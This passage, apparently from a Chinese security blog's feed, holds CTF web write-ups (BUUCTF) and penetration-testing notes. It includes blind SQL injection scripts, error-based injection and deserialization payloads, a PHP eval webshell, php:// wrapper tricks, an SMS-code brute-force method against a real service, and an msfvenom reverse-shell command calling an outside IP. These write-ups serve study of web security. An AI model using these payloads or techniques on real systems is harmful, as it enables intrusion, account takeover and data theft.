&apos;flag&apos;</span><br></pre></td></tr></table></figure><p>发现过滤了不少函数和符号，在过滤了空格时可以用下面这种形式绕过空格检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(flag)from(flag)</span><br></pre></td></tr></table></figure><p>异或盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0^(ascii(substr((select(flag)from(flag)),1,1))=1)</span><br></pre></td></tr></table></figure><p>编写盲注脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">for k in range(32,127):</span><br><span class="line">payload=&quot;0^(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))=&#123;1&#125;)&quot;.format(i,k)</span><br><span class="line">data=&#123;&quot;id&quot;:payload&#125;</span><br><span class="line">r = requests.post(&quot;http://46fc8e21-55b1-4fa5-a43c-0ec93a61474a.node3.buuoj.cn/index.php&quot;,data=data)</span><br><span class="line">if &quot;Hello&quot; in r.text:</span><br><span class="line">flag=flag+chr(k)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p>跑出flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b6b8b3fc-ee39-4317-9378-62dbe3b9fcc1&#125;</span><br></pre></td></tr></table></figure><h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p>注册一个账号进去加单引号报错发现有注入</p><p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200720163553250.png" alt="image-20200720163553250"></p><p>发现有过滤，尝试报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(&apos;~&apos;,(select(group_concat(database())))))%23</span><br></pre></td></tr></table></figure><p>得到数据库名<code>fakebook</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(&apos;~&apos;,(select data from users)))%23</span><br></pre></td></tr></table></figure><p>发现data字段是个反序列化数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:</span><br></pre></td></tr></table></figure><p>尝试拼接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(&apos;~&apos;,(select group_concat(right(data,32)) from users)))%23</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i:18;s:4:&quot;blog&quot;;s:8:&quot;lego.com&quot;</span><br><span class="line">s:4:&quot;name&quot;;s:4:&quot;lego&quot;;s:3:&quot;age&quot;</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:</span><br><span class="line">得出</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;name&quot;;s:4:&quot;lego&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:8:&quot;lego.com&quot;;&#125;</span><br></pre></td></tr></table></figure><p>访问robots.txt发现有提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure><p>发现是一段序列化的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;1&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;file:///var/www/html/flag.php&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new UserInfo();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=0 union/**/select/**/21,11,21,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos;%23</span><br></pre></td></tr></table></figure><p>查看源码发现有个base64数据，解码可得flag</p><h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>用burp fuzz后缀</p><p>发现可以上传phtml文件</p><p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200721105639085.png" alt="image-20200721105639085"></p><p>插入php代码，发现存在内容检测，不能直接插入&lt;?php&gt;这种标签</p><p>插入这种标签即可绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&apos;php&apos;&gt; @eval($_POST[&apos;pass&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p>这题以前做过，写脚本跑哪个是shell文件的，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">print(&apos;开始时间：  &apos;+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(100)  #这儿设置最大的线程数</span><br><span class="line">requests.adapters.DEFAULT_RETRIES = 5#设置重连次数，防止线程数过高，断开连接</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = False#设置连接活跃状态为False</span><br><span class="line">filePath = r&quot;C:/Users/Think/Desktop/www/src&quot;            #自己替换为文件所在目录</span><br><span class="line">os.chdir(filePath)#改变当前的路径</span><br><span class="line">files = os.listdir(filePath)                            #获取文件列表</span><br><span class="line"></span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    print(&apos;trying   &apos;+file+ &apos;     &apos;+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    with open(file,encoding=&apos;utf-8&apos;) as f:#打开php文件，提取所有的$_GET和$_POST的参数</span><br><span class="line">            gets = list(re.findall(&apos;\$_GET\[\&apos;(.*?)\&apos;\]&apos;, f.read()))</span><br><span class="line">            posts = list(re.findall(&apos;\$_POST\[\&apos;(.*?)\&apos;\]&apos;, f.read()))</span><br><span class="line">    data = &#123;&#125;#所有的$_POST</span><br><span class="line">    params = &#123;&#125;#所有的$_GET</span><br><span class="line">    for m in gets:</span><br><span class="line">        params[m] = &quot;echo &apos;xxxxxx&apos;;&quot;</span><br><span class="line">    for n in posts:</span><br><span class="line">        data[n] = &quot;echo &apos;xxxxxx&apos;;&quot;</span><br><span class="line">    url = &apos;http://127.0.0.1/src/&apos;+file                  #自己替换为本地url</span><br><span class="line">    req = session.post(url, data=data, params=params)#一次性请求所有的GET和POST</span><br><span class="line">    req.close()#关闭请求  释放内存</span><br><span class="line">    req.encoding = &apos;utf-8&apos;</span><br><span class="line">    content = req.text</span><br><span class="line">    #print(content)</span><br><span class="line">    if &quot;xxxxxx&quot; in content:#如果发现有可以利用的参数，继续筛选出具体的参数</span><br><span class="line">        flag = 0</span><br><span class="line">        for a in gets:</span><br><span class="line">            req = session.get(url+&apos;?%s=&apos;%a+&quot;echo &apos;xxxxxx&apos;;&quot;)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()# 关闭请求  释放内存</span><br><span class="line">            if &quot;xxxxxx&quot; in content:</span><br><span class="line">                flag = 1</span><br><span class="line">                break</span><br><span class="line">        if flag != 1:</span><br><span class="line">            for b in posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:&quot;echo &apos;xxxxxx&apos;;&quot;&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()# 关闭请求  释放内存</span><br><span class="line">                if &quot;xxxxxx&quot; in content:</span><br><span class="line">                    break</span><br><span class="line">        if flag == 1: #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span><br><span class="line">            param = a</span><br><span class="line">        else:</span><br><span class="line">            param = b</span><br><span class="line">        print(&apos;找到了利用文件： &apos;+file+&quot;  and 找到了利用的参数：%s&quot; %param)</span><br><span class="line">        print(&apos;结束时间：  &apos; + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line">for i in files:#加入多线程</span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure><p>最后跑出来是xk0SzyKwfzw.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xk0SzyKwfzw.php?Efa5BVG=cat /flag</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h3><p>查看源码发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">$password = $_POST[&apos;password&apos;];</span><br><span class="line">if (is_numeric($password)) &#123;</span><br><span class="line">echo &quot;password can&apos;t be number&lt;/br&gt;&quot;;</span><br><span class="line">&#125;elseif ($password == 404) &#123;</span><br><span class="line">echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>考点</p><ul><li><p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p></li><li><p>此题用到的是PHP 5.3.5，老版本PHP了。要求我们不能输入8位字符，而输入其他任何字符都会返回you have not enough money,loser~，合理猜测一下用的是strcmp，那么直接money[]传入一个数组就好了。</p></li></ul><p>bp抓包：将user=1,且password=404%20</p><p>然后还要 money=100000000</p><p>传入一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=404%20&amp;money[]=111</span><br></pre></td></tr></table></figure><h3 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h3><p>index.php.bak有源码泄露</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;key&apos;])) &#123;</span><br><span class="line">    $key = $_GET[&apos;key&apos;];</span><br><span class="line">    if(!is_numeric($key)) &#123;   </span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key == $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型匹配key=123传入参数就可以得到flag了</p><h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>上传点存在php黑名单，可以用phtml绕过黑名单限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&apos;cat /flag&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上传一个这个可得到flag</p><p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200728141249042.png" alt="image-20200728141249042"></p><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>访问得到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&apos;r&apos;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&apos;r&apos;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>isset — 检测变量是否已设置并且非 NULL<br>file_get_contents — 将整个文件读入一个字符串</p><p>通过data协议绕过第一个if</p><p>伪协议读uselist.php内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>序列化数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>构造最终poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php?password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>查看源码得知flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="笔记" scheme="https://legoc.github.io/categories/笔记/"/>
    
    
    <category term="WEB" scheme="https://legoc.github.io/tags/WEB/"/>
    
    <category term="CTF" scheme="https://legoc.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>一个有趣的任意密码重置</title>
    <link href="https://legoc.github.io/2020/07/07/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"/>
    <id>https://legoc.github.io/2020/07/07/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/</id>
    <published>2020-07-07T00:05:42.000Z</published>
    <updated>2020-07-11T23:31:35.323Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ASRC搞了个八周年庆，又来了一个交漏洞送衣服的活动。通过以前挖洞的经验，感觉某个业务细一点挖应该还是有洞的，就回去炒老饭了。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>登入处抓包，发现这里存在一个账号枚举，发现通过爆破不同的username，即通过遍历手机号码得知该手机号码是否在该业务上注册过。</p><ul><li>未注册时</li></ul><p><img src="/2020/07/07/一个有趣的任意密码重置/image-20200707081452639.png" alt="image-20200707081452639"></p><ul><li>注册过时</li></ul><p><img src="/2020/07/07/一个有趣的任意密码重置/image-20200707081929996.png" alt="image-20200707081929996"></p><p>这个业务点还可以通过手机号码接收验证码登入，因为存在60s才能发送一次的限制所以没有短信轰炸，但是可以通过抓这个发送验证码的包，可以造成一个横向的短信轰炸。</p><p><img src="/2020/07/07/一个有趣的任意密码重置/image-20200707082417432.png" alt="image-20200707082417432"></p><p>（这里的测试是否可以通过xff头等绕过短信发送频率限制的插件是coolcat师傅写的<a href="https://github.com/TheKingOfDuck/burpFakeIP" target="_blank" rel="noopener">burpFakeIP</a>)</p><p>这里收到的验证码为4位数，然后每个验证码可以使用3次，还是存在一定爆破的可能性，相当于可以任意登入账户，或者先枚举一些用户，然后再批量随机爆破验证码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一个burp intruder跑发送验证码的  比如一个跑1371234XXXX</span><br><span class="line">一个burp intruder跑验证验证码的  然后这个跑验证码为任意一个四位数的验证码 跟着上面跑</span><br><span class="line">理论上发一次包 跑出来的概率是万分之一</span><br></pre></td></tr></table></figure><p>而且验证码可以重复使用</p><p>登入进去查看信息，看burp里面的包”registerTime”:”2020-06-30应该就是刚刚爆破的时候创建的账号，默认在没有创建过账号的情况下，爆破成功验证码就会自动创建账号，</p><p><img src="/2020/07/07/一个有趣的任意密码重置/image-20200707083321580.png" alt="image-20200707083321580"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以前倒是遇到过不少四位数验证码爆破的，但是这种可以结合短信遍历，一个短信验证码只能验证三次的，最后能成功利用的还是第一次遇到，关键还是这里不存在图片验证码或者行为验证码可操作性强了很多。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://legoc.github.io/categories/渗透测试/"/>
    
    
    <category term="渗透测试" scheme="https://legoc.github.io/tags/渗透测试/"/>
    
    <category term="SRC挖掘" scheme="https://legoc.github.io/tags/SRC挖掘/"/>
    
  </entry>
  
  <entry>
    <title>metaspolit操作笔记</title>
    <link href="https://legoc.github.io/2019/10/13/metaspolit%E6%93%8D%E4%BD%9C%E7%AC%94%E8%AE%B0/"/>
    <id>https://legoc.github.io/2019/10/13/metaspolit%E6%93%8D%E4%BD%9C%E7%AC%94%E8%AE%B0/</id>
    <published>2019-10-13T01:55:34.000Z</published>
    <updated>2019-10-13T02:40:01.817Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p>生成tcp windows payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp lhost=122.152.210.119 lport=4322  -f exe -o  shell.exe</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://legoc.github.io/categories/渗透测试/"/>
    
    
    <category term="笔记" scheme="https://legoc.github.io/tags/笔记/"/>
    
    <category term="渗透测试" scheme="https://legoc.github.io/tags/渗透测试/"/>
    
    <category term="信息收集" scheme="https://legoc.github.io/tags/信息收集/"/>
    
  </entry>
  
  <entry>
    <title>初试xray</title>
    <link href="https://legoc.github.io/2019/08/14/%E5%88%9D%E8%AF%95xray/"/>
    <id>https://legoc.github.io/2019/08/14/%E5%88%9D%E8%AF%95xray/</id>
    <published>2019-08-14T13:33:00.000Z</published>
    <updated>2019-08-23T12:16:45.351Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很早之前就想搞个好用的被动扫描器，之前搭过像GourdScan，NagaScan，都感觉不是很舒服，用的不爽，今天看到长亭大牛们写的xray，感觉这东西很符合我的胃口，初步使用了一下，感觉很舒服，冲起来！</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>项目地址：xray    <a href="https://github.com/chaitin/xray/tree/master/docs" target="_blank" rel="noopener">https://github.com/chaitin/xray/tree/master/docs</a></p><p>特点：可扫描单个url、可使用基础爬虫扫描，可使用被动扫描。被动扫描支持https。</p><p>官方文档 <a href="https://chaitin.github.io/xray/" target="_blank" rel="noopener">https://chaitin.github.io/xray/</a></p><p>这也太舒服了8。</p><p>写些笔记来记录一下一些点。</p><h3 id="设置被动扫描"><a href="#设置被动扫描" class="headerlink" title="设置被动扫描"></a>设置被动扫描</h3><p>官方文档上写到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777</span><br></pre></td></tr></table></figure><p>这也可以在本地代理，但是远程的ip端口是关闭的，因为这里是127.0.0.1，这个应该是常识，</p><p>但是一开始我还是踩了坑，太弟弟了。</p><p>设置远程代理的方式，即扫描器在我VPS上部署</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --listen 0.0.0.0:7777 --html-output result.html</span><br></pre></td></tr></table></figure><p>然后firefox上可以直接设置代理 ip : 7777</p><p>快速搭起一个http服务查看报告</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 6666</span><br></pre></td></tr></table></figure><h3 id="扫描https"><a href="#扫描https" class="headerlink" title="扫描https"></a>扫描https</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray genca</span><br></pre></td></tr></table></figure><p>添加ca.crt证书到浏览器</p><h4 id="自定义POC"><a href="#自定义POC" class="headerlink" title="自定义POC"></a>自定义POC</h4><p>在线编写环境 <a href="https://phith0n.github.io/xray-poc-generation/" target="_blank" rel="noopener">https://phith0n.github.io/xray-poc-generation/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray webscan --plugins phantasm --poc /home/ubuntu/tools/xray/pocs/poc-yaml-discuz-x25-path-disclosure --url http://122.152.210.119/Discuz/</span><br></pre></td></tr></table></figure><p>例如一个简单的discuz物理路径泄露的poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name: poc-yaml-discuz_x25_path_disclosure</span><br><span class="line">rules:</span><br><span class="line">  - method: GET</span><br><span class="line">    path: /uc_server/control/admin/db.php</span><br><span class="line">    follow_redirects: true</span><br><span class="line">    expression: r&apos;Fatal error.* on line&apos;.bmatches(body)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray webscan --plugins phantasm --poc /home/ubuntu/tools/xray/pocs/poc-yaml-weblogic-cve-2017-10271-rce --url http://122.152.210.119:7001</span><br></pre></td></tr></table></figure><h5 id="调用反向连接平台"><a href="#调用反向连接平台" class="headerlink" title="调用反向连接平台"></a>调用反向连接平台</h5><p>例如weblogic反序列化CVE-2017-10271 poc编写</p><p>如果是在VPS上搭建的环境反向连接平台配置参考 <a href="https://chaitin.github.io/xray/#/guide/reverse" target="_blank" rel="noopener">https://chaitin.github.io/xray/#/guide/reverse</a>  场景2</p><p>即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 